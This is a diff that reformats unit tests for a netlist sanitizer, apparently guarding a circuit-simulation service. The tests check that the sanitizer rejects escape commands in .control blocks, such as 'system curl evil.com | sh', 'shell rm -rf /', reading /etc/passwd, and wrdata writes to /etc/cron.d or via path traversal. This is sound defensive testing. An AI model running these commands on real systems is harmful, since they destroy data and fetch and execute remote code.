@@ -129,17 +129,27 @@ R1 in out 1k
             expect(() => sanitizeNetlist(netlist, jobDir)).not.toThrow();
         });
 
-        it.each(['shell rm -rf /', 'system curl evil.com | sh', 'source /etc/passwd', 'exec /bin/sh', 'cd /', 'osdi /tmp/evil.so', 'codemodel /tmp/evil.cm', 'load /tmp/x.raw'])(
-            'rejects a code-execution/escape command INSIDE a .control block: "%s"',
-            (badCmd) => {
-                const netlist = `.control\n  ${badCmd}\n.endc`;
-                expect(() => sanitizeNetlist(netlist, jobDir)).toThrow(SecurityError);
-            },
-        );
+        it.each([
+            'shell rm -rf /',
+            'system curl evil.com | sh',
+            'source /etc/passwd',
+            'exec /bin/sh',
+            'cd /',
+            'osdi /tmp/evil.so',
+            'codemodel /tmp/evil.cm',
+            'load /tmp/x.raw',
+        ])('rejects a code-execution/escape command INSIDE a .control block: "%s"', (badCmd) => {
+            const netlist = `.control\n  ${badCmd}\n.endc`;
+            expect(() => sanitizeNetlist(netlist, jobDir)).toThrow(SecurityError);
+        });
 
         it('rejects wrdata writing OUTSIDE the job dir (absolute path)', () => {
-            expect(() => sanitizeNetlist(`.control\n  wrdata /etc/cron.d/x v(in)\n.endc`, jobDir)).toThrow(SecurityError);
-            expect(() => sanitizeNetlist(`.control\n  wrdata ../../escape.csv v(in)\n.endc`, jobDir)).toThrow(SecurityError);
+            expect(() => sanitizeNetlist(`.control\n  wrdata /etc/cron.d/x v(in)\n.endc`, jobDir)).toThrow(
+                SecurityError,
+            );
+            expect(() => sanitizeNetlist(`.control\n  wrdata ../../escape.csv v(in)\n.endc`, jobDir)).toThrow(
+                SecurityError,
+            );
         });
 
         it('does NOT false-positive on a device whose designator starts with a blocked word (Cd1, Lload2)', () => {
